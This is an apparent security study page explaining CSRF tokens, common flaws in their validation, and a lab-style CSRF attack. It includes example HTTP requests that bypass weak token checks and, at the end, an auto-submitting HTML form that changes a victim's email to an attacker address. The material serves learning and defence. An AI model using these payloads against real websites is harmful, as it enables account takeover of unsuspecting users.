---
layout: page
title: Cross-Site Request Forgery (CSRF)
parent: Web Application
grand_parent: Attacks
---
# {{ page.title }}
{: .no_toc }

<details open markdown="block">
  <summary>
	Table of contents
  </summary>
  {: .text-delta }
- TOC
{:toc}
</details>

---
A CSRF token is a unique, secret, and unpredictable value that is generated by the server-side application and shared with the client. When issuing a request to perform a sensitive action, such as submitting a form, the client must include the correct CSRF token.

A common way to share CSRF tokens with the client is to include them as a hidden parameter in a HTML form, for example:

{% highlight HTML %}
<form name="change-email-form" action="/my-account/change-email" method="POST">
	<label>Email</label>
	<input required type="email" name="email" value="example@normal-website.com">
	<input required type="hidden" name="csrf" value="50FaWgdOhi9M9wyna8taR1k3ODOR8d6u"> 
	<button class='button' type='submit'> Update email </button>
</form>
{% endhighlight %}
> Some applications place CSRF tokens in HTTP headers, the way the tokens are transmitted have significant impact on the security mechanism as a whole. More info, [How to prevent CSRF vulnerabilities](https://portswigger.net/web-security/csrf/preventing).

When implemented correctly, CSRF Tokens help protect against CSRF attacks by making it difficult for an attacker to construct a valid request on behalf of a victim. 

## Common flaws in CSRF token validation
CSRF vulnerabilities typically arise due to flawed validation of CSRF tokens.

### Validation depends on request method
Some applications validate the token when a POST method is used but skip validation when a GET method is used.
The attacker can switch to the GET method to bypass the validation and deliver a CSRF attack:
{% highlight HTTP %}
GET /email/change?email=pwned@evil-user.net HTTP/1.1 
Host: vulnerable-website.com Cookie: 

session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm
{% endhighlight %}

### Validation depends on token being present
Some applications only validate if a token is present but skip validation if no token is supplied

{% highlight HTTP %}
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 25 
Cookie: session=2yQIDcpia41WrATfjPqvm9tOkDvkMvLm 

email=pwned@evil-user.net
{% endhighlight %}

### CSRF token is not tied to the user session
Some applications do not validate that the token belongs to the same session as the user who is making the request. Instead, the application maintains a global pool of tokens that it has issued and accepts any token that appears in this pool.

In this situation, the attacker can log in to the application using their own account, obtain a valid token, and then feed that token to the victim user in their CSRF attack.

### CSRF token is tied to a non-session cookie
In a variation on the preceding vulnerability, some applications do tie the CSRF token to a cookie, but not to the same cookie that is used to track sessions. This can easily occur when an application employs two different frameworks, one for session handling and one for CSRF protection, which are not integrated together:

{% highlight HTTP %}
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 68 
Cookie: session=pSJYSScWKpmC60LpFOAHKixuFuM4uXWF; csrfKey=rZHCnSzEp8dbI6atzagGoSYyqJqTz5dv 

csrf=RhV7yQDO0xcq9gLEah2WVbmuFqyOq7tY&email=wiener@normal-user.com
{% endhighlight %}

This situation is harder to exploit but is still vulnerable. If the web site contains any behaviour that allows an attacker to set a cookie in a victim's browser, then an attack is possible. The attacker can log in to the application using their own account, obtain a valid token and associated cookie, leverage the cookie-setting behaviour to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

> The cookie-setting behaviour does not even need to exist within the same web application as the [CSRF vulnerability](https://portswigger.net/web-security/csrf). Any other application within the same overall DNS domain can potentially be leveraged to set cookies in the application that is being targeted, if the cookie that is controlled has suitable scope. For example, a cookie-setting function on `staging.demo.normal-website.com` could be leveraged to place a cookie that is submitted to `secure.normal-website.com`.

### CSRF token is simply duplicated in a cookie
In a further variation on the preceding vulnerability, some applications do not maintain any server-side record of tokens that have been issued, but instead duplicate each token within a cookie and a request parameter. When the subsequent request is validated, the application simply verifies that the token submitted in the request parameter matches the value submitted in the cookie. This is sometimes called the "double submit" defence against CSRF, and is advocated because it is simple to implement and avoids the need for any server-side state:

{% highlight HTTP %}
POST /email/change HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-www-form-urlencoded 
Content-Length: 68 
Cookie: session=1DQGdzYbOJQzLP7460tfyiv3do7MjyPw; csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa 

csrf=R8ov2YBfTYmzFyjit8o2hKBuoIjXXVpa&email=wiener@normal-user.com
{% endhighlight %}

In this situation, the attacker can again perform a CSRF attack if the web site contains any cookie setting functionality. Here, the attacker doesn't need to obtain a valid token of their own. They simply invent a token (perhaps in the required format, if that is being checked), leverage the cookie-setting behaviour to place their cookie into the victim's browser, and feed their token to the victim in their CSRF attack.

---

## Executing a CSRF attack

### CSRF vulnerability with no defences
Created a webpage that submitted a form as a POST request that contained a secret input with the vulnerable field to the endpoint of a change-email action. Then a link to this website was added in a comment so if a user clicked it, it would send the request and it would just use their previous session token that the browser remembers.

{% highlight HTML %}
<form method="POST" action="https://wwww.example.net/my-account/change-email">
	<input type="hidden" name="email" value="hacked@exploit.com">
</form>

<script>
	document.forms[0].submit();
</script>
{% endhighlight %}